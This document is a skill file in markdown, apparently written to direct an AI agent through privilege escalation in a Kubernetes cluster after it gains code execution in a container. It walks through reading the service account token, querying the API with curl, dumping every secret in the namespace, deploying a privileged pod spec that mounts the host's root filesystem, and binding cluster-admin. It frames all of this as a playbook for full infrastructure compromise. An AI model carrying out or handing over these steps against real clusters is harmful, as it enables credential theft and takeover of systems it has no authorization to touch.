---
name: kubernetes_rbac_abuse
description: Techniques for identifying execution within a Kubernetes container, extracting service account tokens, and abusing permissive Role-Based Access Control (RBAC) permissions to escalate privileges within the cluster.
---

# Kubernetes RBAC & Cluster Privilege Escalation

When you obtain execution inside a container application (e.g., via Remote Code Execution, Server-Side Template Injection, or an arbitrary file read), you must determine if the container is running within a Kubernetes cluster. If it is, your goal is to extract the local Service Account Token and interrogate the cluster's API for excessive permissions.

## 1. Environment Discovery

First, determine if you are inside a Kubernetes container. Look for the following indicators:

*   **Environment Variables:** Check for variables prefixed with `KUBERNETES_` (e.g., `KUBERNETES_SERVICE_HOST`, `KUBERNETES_PORT`).
*   **Service Account Tokens:** The presence of the following directory is the most critical indicator:
    `/var/run/secrets/kubernetes.io/serviceaccount/`

## 2. Token Extraction

If the `serviceaccount` directory exists, extract the critical files needed to communicate with the Kubernetes API:

*   **The Token:** `/var/run/secrets/kubernetes.io/serviceaccount/token` (This is your JWT authentication token)
*   **The Namespace:** `/var/run/secrets/kubernetes.io/serviceaccount/namespace` (The namespace your pod is running in)
*   **The CA Certificate:** `/var/run/secrets/kubernetes.io/serviceaccount/ca.crt` (Used to verify the API server's TLS certificate)

*Tip: If you only have Arbitrary File Read (LFI/Path Traversal) instead of RCE, you can simply read `/var/run/secrets/kubernetes.io/serviceaccount/token` directly to steal the identity of the Pod without needing a reverse shell.*

## 3. API Interrogation (Accessing the Cluster)

Once you have the token, you can directly query the Kubernetes REST API. The API is usually accessible internally at `https://kubernetes.default.svc` or at the IP defined by `KUBERNETES_SERVICE_HOST`.

Setup your environment variables in the shell (or adapt to `curl` commands directly):
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
```

### Self-Subject Access Review (What can I do?)
The easiest way to find out what permissions the current compromised token has is to ask the API via a `SelfSubjectAccessReview` or `SelfSubjectRulesReview`.

Using `curl`:
```bash
curl -k -H "Authorization: Bearer $TOKEN" \
  -X POST $API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d '{"spec":{"namespace":"'$NAMESPACE'"}}' \
  -H "Content-Type: application/json"
```
This will return a JSON object detailing exactly what verbs (`get`, `list`, `create`, `*`) you can perform on what resources (`pods`, `secrets`, `roles`, `*`).

## 4. Exploiting Permissive RBAC

Depending on the permissions returned by the `SelfSubjectRulesReview`, look for high-impact abuse vectors:

### A. Listing Secrets (Read All Secrets)
If you have the `list` verb on the `secrets` resource, you can dump all secrets in the namespace, which often includes tokens for other default accounts, database passwords, and API keys.
```bash
curl -k -H "Authorization: Bearer $TOKEN" $API/api/v1/namespaces/$NAMESPACE/secrets
```

### B. Creating Pods (Container Escape / Privilege Escalation)
If you have the `create` verb on `pods`, you can launch a new malicious pod.
To achieve full cluster compromise, you can deploy a "privileged" pod that mounts the underlying worker node's root filesystem.

*Malicious Pod Spec snippet (creates a pod that mounts `/` of the host to `/mnt` inside the pod):*
```json
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "root-escape",
    "namespace": "default"
  },
  "spec": {
    "containers": [
      {
        "name": "alpine",
        "image": "alpine:latest",
        "command": ["/bin/sh", "-c", "sleep 3600"],
        "volumeMounts": [
          {
            "mountPath": "/host-root",
            "name": "host-root-volume"
          }
        ],
        "securityContext": {
          "privileged": true
        }
      }
    ],
    "volumes": [
      {
        "name": "host-root-volume",
        "hostPath": {
          "path": "/"
        }
      }
    ]
  }
}
```
Send this JSON structure via a `POST` request to `$API/api/v1/namespaces/$NAMESPACE/pods`. Once the pod runs, you can execute commands inside it and modify the host filesystem (e.g., adding an SSH key or tampering with `containerd`).

### C. Creating Role Bindings (Direct Escalation)
If the token has permissions to `bind` cluster roles or `create rolebindings`, you can attach the `cluster-admin` (or another highly permissive role) directly to your compromised service account, granting you God-mode over the Kubernetes cluster.

## Key Takeaway
Whenever RCE or SSRF is discovered in a containerized environment, immediately seek out `/var/run/secrets/kubernetes.io/serviceaccount/token` and query `SelfSubjectRulesReview`. Exploiting RBAC misconfigurations is the fastest path from a single container breach to entire infrastructure compromise.
